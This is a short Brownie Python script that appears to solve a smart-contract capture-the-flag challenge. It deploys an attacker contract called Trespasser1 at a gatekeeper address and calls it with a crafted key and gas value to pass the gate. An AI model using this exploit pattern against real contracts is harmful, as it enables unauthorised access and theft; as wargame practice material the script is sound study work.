from brownie import Trespasser1, accounts, web3, convert

def deploy(gatekeeper_addr):
  me = accounts.load("default")
  trespasser = Trespasser1.deploy(gatekeeper_addr, {'from': me})
  main(trespasser.address)

def main(trespasser_addr):
  me = accounts.load("default")
  trespasser = Trespasser1.at(trespasser_addr)
  trespasser.wrectIt("0x26bbE18a00007245", 802929, {'from':me, 'gas_limit':'1000000000000000000'})